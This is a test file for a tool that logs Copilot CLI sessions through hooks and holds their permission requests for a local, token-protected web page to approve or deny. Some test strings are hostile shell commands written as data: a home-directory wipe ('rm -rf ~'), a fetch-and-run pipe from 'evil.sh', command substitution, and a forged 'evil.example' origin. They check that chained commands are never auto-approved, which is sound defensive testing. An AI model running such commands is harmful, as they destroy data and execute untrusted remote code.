// The desk: a hook that records your own Copilot CLI sessions without changing them,
// and a report of how often each repo's session stopped to wait for you.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { answer, commandOf, commandPrefix, DEFAULTS, hold, ruleMatches, modesFile, pageFile, pending, rulesFile, writeJson, type Rule } from "../src/desk/hold.ts";
import { hooksConfig, install, uninstall } from "../src/desk/install.ts";
import { readLog, toEvent, type DeskEvent } from "../src/desk/log.ts";
import { renderReport, report, waits } from "../src/desk/report.ts";
import { startDesk } from "../src/desk/server.ts";
import { deskView } from "../src/desk/view.ts";

const ROOT = path.resolve(import.meta.dirname, "..");
const HOOK = path.join(ROOT, "src", "desk", "hook.ts");
const tmp = (n: string) => fs.mkdtempSync(path.join(os.tmpdir(), `af-desk-${n}-`));

const runHook = (event: string, input: string, env: Record<string, string>) =>
  spawnSync(process.execPath, ["--no-warnings", HOOK, event], { input, env: { ...process.env, ...env }, encoding: "utf8" });

test("the hook records an event and prints nothing, so Copilot goes on as usual", () => {
  const home = tmp("hook");
  const r = runHook("permissionRequest", JSON.stringify({ sessionId: "s1", timestamp: 1000, cwd: "/work/billing", toolName: "shell", toolInput: { command: "npm test" } }), { AF_DESK_HOME: home, AF_DESK_TERMINAL: "billing" });
  assert.equal(r.status, 0);
  assert.equal(r.stdout, "");
  const [e] = readLog(home);
  assert.deepEqual(e, { at: 1000, event: "permissionRequest", session: "s1", cwd: "/work/billing", terminal: "billing", tool: "shell", detail: '{"command":"npm test"}' });
});

test("a hook that can't record still exits 0 and prints nothing, so it never denies a tool call", () => {
  const home = tmp("bad");
  for (const [event, input] of [["permissionRequest", "not json"], ["noSuchEvent", "{}"]]) {
    const r = runHook(event, input, { AF_DESK_HOME: home });
    assert.equal(r.status, 0);
    assert.equal(r.stdout, "");
  }
  assert.deepEqual(readLog(home), []);
});

test("events read the same in Copilot's camelCase and VS Code-style snake_case", () => {
  const a = toEvent("permissionRequest", { sessionId: "s", cwd: "/r", toolName: "write", toolArgs: "x", timestamp: 5 }, {});
  const b = toEvent("permissionRequest", { session_id: "s", cwd: "/r", tool_name: "write", tool_input: "x", timestamp: new Date(5).toISOString() }, {});
  assert.deepEqual(a, b);
});

test("long tool input is cut short in the log", () => {
  const e = toEvent("permissionRequest", { sessionId: "s", cwd: "/r", toolInput: "x".repeat(1000) }, {});
  assert.ok(e.detail && e.detail.length < 400);
});

test("install writes one hooks file in your Copilot folder covering every event, and uninstall removes it", () => {
  const dir = tmp("install");
  const file = install(HOOK, dir);
  const cfg = JSON.parse(fs.readFileSync(file, "utf8"));
  assert.equal(cfg.version, 1);
  assert.deepEqual(Object.keys(cfg.hooks).sort(), ["agentStop", "notification", "permissionRequest", "postToolUse", "sessionEnd", "sessionStart", "userPromptSubmitted"]);
  for (const entries of Object.values(cfg.hooks) as Array<Array<{ powershell: string; bash: string; timeoutSec: number }>>) {
    assert.ok(entries[0].powershell.includes(HOOK) && entries[0].bash.includes(HOOK));
  }
  // Recording is quick; only a permission request waits, for your answer on the desk.
  assert.equal(cfg.hooks.notification[0].timeoutSec, 5);
  assert.ok(cfg.hooks.permissionRequest[0].timeoutSec >= 3600);
  assert.equal(uninstall(dir), true);
  assert.equal(fs.existsSync(file), false);
  assert.equal(uninstall(dir), false);
});

test("hook commands quote the script path, so a folder with spaces works", () => {
  const cfg = hooksConfig("C:\\My Tools\\hook.ts") as { hooks: Record<string, Array<{ powershell: string }>> };
  assert.match(cfg.hooks.notification[0].powershell, /"C:\\My Tools\\hook\.ts" notification$/);
});

const at = (s: number) => s * 1000;
const LOG: DeskEvent[] = [
  { at: at(0), event: "sessionStart", session: "a", cwd: "/w/billing" },
  { at: at(1), event: "permissionRequest", session: "a", cwd: "/w/billing", tool: "view" },
  { at: at(2), event: "permissionRequest", session: "a", cwd: "/w/billing", tool: "shell", detail: "npm test" },
  { at: at(2), event: "notification", session: "a", cwd: "/w/billing", kind: "permission_prompt" },
  { at: at(32), event: "permissionRequest", session: "a", cwd: "/w/billing", tool: "shell", detail: "npm run lint" },
  { at: at(32), event: "notification", session: "a", cwd: "/w/billing", kind: "permission_prompt" },
  { at: at(42), event: "agentStop", session: "a", cwd: "/w/billing" },
  { at: at(42), event: "notification", session: "a", cwd: "/w/billing", kind: "agent_idle" },
  { at: at(5), event: "sessionStart", session: "b", cwd: "/w/web" },
  { at: at(6), event: "notification", session: "b", cwd: "/w/web", kind: "elicitation_dialog", message: "Which database?" },
  { at: at(126), event: "userPromptSubmitted", session: "b", cwd: "/w/web" },
].sort((x, y) => x.at - y.at);

test("a wait starts when Copilot shows you a prompt and ends at that session's next event", () => {
  const ws = waits(LOG);
  assert.deepEqual(ws.map((w) => [w.repo, w.why, w.tool, w.waitedMs]), [
    ["billing", "permission", "shell", 30_000],
    ["web", "question", undefined, 120_000],
    ["billing", "permission", "shell", 10_000],
    ["billing", "idle", undefined, undefined],
  ]);
  assert.equal(ws[1].detail, "Which database?");
});

test("the report counts per repo how often a session stopped for you, apart from checks your rules let through", () => {
  const rows = report(LOG);
  const billing = rows.find((r) => r.repo === "billing")!;
  assert.deepEqual({ ...billing }, { repo: "billing", sessions: 1, permissions: 2, onPage: 0, byRule: 0, questions: 0, idle: 1, asked: 3, medianWaitMs: 10_000, tools: [["shell", 2]] });
  assert.equal(rows.find((r) => r.repo === "web")!.questions, 1);
  assert.match(renderReport(rows), /3 times a session stopped for you; 3 permission checks/);
  assert.match(renderReport([]), /Nothing recorded yet/);
});

// ---- Holding permission asks for the desk ----

const deskOn = (home: string) => writeJson(pageFile(home), { at: Date.now() });
// A clock where each wait is a minute, with the desk still beating.
const fastClock = (home: string) => {
  let t = Date.now();
  return { now: () => t, sleep: async () => { t += 60_000; writeJson(pageFile(home), { at: t }); } };
};
const ask = (over: Partial<DeskEvent> = {}): DeskEvent => ({ at: Date.now(), event: "permissionRequest", session: "s1", cwd: "/w/billing", tool: "shell", detail: '{"command":"npm test"}', ...over });

// Answers whatever the hook is waiting on, as the page would.
async function answerWhenAsked(home: string, choice: "allow" | "deny" | "terminal" | "always", note?: string) {
  for (let i = 0; i < 200; i++) {
    const [a] = pending(home);
    if (a) return answer(a.id, choice, note, home);
    await new Promise((r) => setTimeout(r, 10));
  }
  throw new Error("nothing was asked");
}

test("with the desk running, an ask waits there and your Allow is what Copilot gets", async () => {
  const home = tmp("allow");
  deskOn(home);
  const [r] = await Promise.all([hold(ask(), { home, pollMs: 5 }), answerWhenAsked(home, "allow")]);
  assert.deepEqual(r.output, { behavior: "allow" });
  assert.equal(r.by, "page");
  assert.deepEqual(pending(home), [], "the ask is cleared once answered");
});

test("a Deny carries your reason back to Copilot", async () => {
  const home = tmp("deny");
  deskOn(home);
  const [r] = await Promise.all([hold(ask(), { home, pollMs: 5 }), answerWhenAsked(home, "deny", "use the staging db")]);
  assert.deepEqual(r.output, { behavior: "deny", message: "Denied from the desk: use the staging db" });
});

test("'answer in the terminal' lets the ask go, so Copilot asks there as usual", async () => {
  const home = tmp("term");
  deskOn(home);
  const [r] = await Promise.all([hold(ask(), { home, pollMs: 5 }), answerWhenAsked(home, "terminal")]);
  assert.deepEqual(r.output, {});
  assert.equal(r.by, "terminal");
});

test("'allow here from now on' answers this ask and every later one for that tool in that terminal only", async () => {
  const home = tmp("always");
  deskOn(home);
  await Promise.all([hold(ask(), { home, pollMs: 5 }), answerWhenAsked(home, "always")]);
  const again = await hold(ask({ detail: "npm run build" }), { home, pollMs: 5 });
  assert.deepEqual([again.output, again.by], [{ behavior: "allow" }, "rule"]);
  // Another repo's terminal still asks.
  assert.equal((await hold(ask({ cwd: "/w/web" }), { home, ...fastClock(home) })).by, "timeout");
});

test("without the desk running nothing is held: the terminal asks as if the desk weren't there", async () => {
  const home = tmp("off");
  const r = await hold(ask(), { home });
  assert.deepEqual([r.output, r.by], [{}, "no-desk"]);
  writeJson(pageFile(home), { at: Date.now() - 60_000 });
  assert.equal((await hold(ask(), { home })).by, "no-desk", "a stale beat is a stopped desk");
});

test("reads pass straight through to Copilot's own rules instead of waiting on you", async () => {
  const home = tmp("pass");
  deskOn(home);
  const r = await hold(ask({ tool: "view" }), { home });
  assert.deepEqual([r.output, r.by], [{}, "pass"]);
  assert.ok(DEFAULTS.passThrough.includes("grep"));
});

test("a terminal set to answer in the terminal is never held", async () => {
  const home = tmp("mode");
  deskOn(home);
  writeJson(modesFile(home), { billing: "terminal" });
  assert.equal((await hold(ask(), { home })).by, "terminal-mode");
});

test("an unanswered ask goes to the terminal when its wait runs out, or at once if the desk stops", async () => {
  const home = tmp("timeout");
  deskOn(home);
  const r = await hold(ask(), { home, ...fastClock(home) });
  assert.deepEqual([r.output, r.by], [{}, "timeout"]);
  const stopped = hold(ask(), { home, pollMs: 5 });
  while (!pending(home).length) await new Promise((r) => setTimeout(r, 5));
  fs.rmSync(pageFile(home));
  assert.equal((await stopped).by, "desk-closed");
});

test("the hook prints the desk's answer as Copilot's permissionRequest output, and logs who decided", async () => {
  const home = tmp("hookhold");
  deskOn(home);
  const child = new Promise<ReturnType<typeof spawnSync>>((resolve) => {
    const p = spawn(process.execPath, ["--no-warnings", HOOK, "permissionRequest"], { env: { ...process.env, AF_DESK_HOME: home, AF_DESK_TERMINAL: "billing" } });
    let stdout = "";
    p.stdout.on("data", (d: Buffer) => (stdout += d));
    p.on("close", (status: number) => resolve({ status, stdout } as never));
    p.stdin.end(JSON.stringify({ sessionId: "s1", cwd: "/w/billing", toolName: "shell", toolInput: { command: "rm -rf dist" } }));
  });
  await answerWhenAsked(home, "deny");
  const r = await child;
  assert.equal(r.status, 0);
  assert.deepEqual(JSON.parse(String(r.stdout)), { behavior: "deny", message: "Denied from the desk." });
  const d = readLog(home).find((e) => e.event === "decision")!;
  assert.deepEqual([d.by, d.choice, d.terminal, d.tool], ["page", "deny", "billing", "shell"]);
});

test("the page lists terminals most urgent first: held asks, then questions, permission prompts, idle, working, closed", () => {
  const now = at(100);
  const log: DeskEvent[] = [
    { at: at(1), event: "sessionStart", session: "a", cwd: "/w/api" },
    { at: at(2), event: "sessionStart", session: "b", cwd: "/w/web", terminal: "web" },
    { at: at(3), event: "notification", session: "b", cwd: "/w/web", terminal: "web", kind: "agent_idle", message: "Done. Want me to add tests?" },
    { at: at(4), event: "sessionStart", session: "c", cwd: "/w/old" },
    { at: at(5), event: "sessionEnd", session: "c", cwd: "/w/old" },
    { at: at(6), event: "sessionStart", session: "d", cwd: "/w/docs" },
    { at: at(7), event: "notification", session: "d", cwd: "/w/docs", kind: "elicitation_dialog", message: "Which style?" },
  ];
  const held = [{ id: "x", at: at(8), session: "a", cwd: "/w/api", terminal: "api", tool: "shell" }];
  const rules: Rule[] = [{ terminal: "web", tool: "write", at: 0 }];
  const v = deskView(log, held, rules, { old: "terminal" }, now, 0);
  assert.deepEqual(v.map((t) => [t.name, t.state]), [["api", "waiting on the desk"], ["docs", "asking you"], ["web", "waiting for your next prompt"], ["old", "closed"]]);
  assert.equal(v[2].said, "Done. Want me to add tests?");
  assert.deepEqual(v[2].rules.map((r) => r.tool), ["write"]);
  assert.equal(v[3].mode, "terminal");
  assert.equal(v[1].stopsToday, 1);
});

test("a new session in a terminal takes over its row", () => {
  const log: DeskEvent[] = [
    { at: at(1), event: "sessionStart", session: "a", cwd: "/w/api" },
    { at: at(2), event: "notification", session: "a", cwd: "/w/api", kind: "agent_idle" },
    { at: at(3), event: "sessionStart", session: "b", cwd: "/w/api" },
  ];
  const [t] = deskView(log, [], [], {}, at(10), 0);
  assert.deepEqual([t.session, t.state], ["b", "working"]);
});

test("the desk's page refuses other hosts and calls without its token, and answers through the same files the hook reads", async () => {
  const home = tmp("server");
  const jumped: string[] = [];
  const desk = await startDesk({ home, port: 0, jump: async (t) => (jumped.push(t), true) });
  try {
    const base = desk.url.replace(/\/$/, "");
    assert.equal((await fetch(`${base}/api/state`)).status, 403, "no token");
    const page = await (await fetch(desk.url)).text();
    assert.ok(page.includes(desk.token));
    const h = { "x-desk-token": desk.token, "content-type": "application/json" };
    assert.equal((await fetch(`${base}/api/answer`, { method: "POST", headers: { ...h, origin: "http://evil.example" }, body: "{}" })).status, 403, "wrong origin");

    // While the desk runs, the hook holds; the page sees the ask and answers it.
    const held = hold(ask(), { home, pollMs: 5 });
    let st: { version: string; terminals: Array<{ name: string; asks: Array<{ id: string }> }> };
    do st = await (await fetch(`${base}/api/state?wait=0`, { headers: h })).json();
    while (!st.terminals[0]?.asks.length);
    const id = st.terminals[0].asks[0].id;
    // A waiting request returns as soon as something changes.
    const waiting = fetch(`${base}/api/state?since=${st.version}&wait=20000`, { headers: h }).then((r) => r.json());
    const res = await fetch(`${base}/api/answer`, { method: "POST", headers: h, body: JSON.stringify({ ask: id, choice: "always" }) });
    assert.equal(res.status, 200);
    assert.deepEqual((await held).output, { behavior: "allow" });
    assert.notEqual((await waiting).version, st.version);
    assert.equal(JSON.parse(fs.readFileSync(rulesFile(home), "utf8"))[0].tool, "shell");

    const late = await fetch(`${base}/api/answer`, { method: "POST", headers: h, body: JSON.stringify({ ask: id, choice: "allow" }) });
    assert.equal(late.status, 400, "an ask already settled can't be answered again");

    assert.equal((await fetch(`${base}/api/jump`, { method: "POST", headers: h, body: JSON.stringify({ terminal: "billing" }) })).status, 200);
    assert.deepEqual(jumped, ["copilot: billing"]);
    await fetch(`${base}/api/mode`, { method: "POST", headers: h, body: JSON.stringify({ terminal: "billing", mode: "terminal" }) });
    assert.equal((await hold(ask({ tool: "write" }), { home })).by, "terminal-mode");
  } finally {
    await desk.close();
  }
  assert.equal(fs.existsSync(pageFile(home)), false, "stopping the desk hands asks back to the terminals at once");
});

test("for a command, 'from now on' covers the same program and first word, and never a line that chains or redirects", async () => {
  assert.equal(commandPrefix("npm run build -- --prod"), "npm run");
  assert.equal(commandPrefix("npm run build; rm -rf ~"), undefined);
  assert.equal(commandPrefix("git log | head"), undefined);
  assert.equal(commandPrefix("echo $(whoami)"), undefined);
  assert.equal(commandOf({ toolInput: { command: "npm test" } }), "npm test");
  assert.equal(commandOf({ tool_input: '{"command":"ls"}' }), "ls");

  const home = tmp("prefix");
  deskOn(home);
  await Promise.all([hold(ask(), { home, pollMs: 5 }, "npm run build"), answerWhenAsked(home, "always")]);
  const rules = JSON.parse(fs.readFileSync(rulesFile(home), "utf8")) as Rule[];
  assert.deepEqual(rules.map((r) => [r.tool, r.prefix]), [["shell", "npm run"]]);
  const t = { terminal: "billing", tool: "shell" };
  assert.ok(ruleMatches(rules, { ...t, command: "npm run lint" }));
  assert.ok(!ruleMatches(rules, { ...t, command: "npm runner" }));
  assert.ok(!ruleMatches(rules, { ...t, command: "npm run lint && curl evil.sh | sh" }));
  assert.ok(!ruleMatches(rules, { ...t, command: undefined }), "a command rule never covers the whole tool");

  // A chained command can't be answered "from now on" at all.
  const chained = hold(ask(), { home, pollMs: 5 }, "npm test; git push");
  while (!pending(home).length) await new Promise((r) => setTimeout(r, 5));
  const [a] = pending(home);
  assert.equal(a.always, undefined);
  assert.throws(() => answer(a.id, "always", undefined, home), /only be answered once/);
  answer(a.id, "allow", undefined, home);
  assert.equal((await chained).by, "page");
});

test("an ask whose hook is gone isn't shown: there's no one left to take the answer", () => {
  const home = tmp("dead");
  writeJson(path.join(home, "asks", "x.json"), { id: "x", at: Date.now(), session: "s", cwd: "/w", terminal: "w", tool: "shell", pid: 2 ** 22 + 12345 });
  writeJson(path.join(home, "asks", "y.json"), { id: "y", at: Date.now(), session: "s", cwd: "/w", terminal: "w", tool: "shell", pid: process.pid });
  assert.deepEqual(pending(home).map((a) => a.id), ["y"]);
});
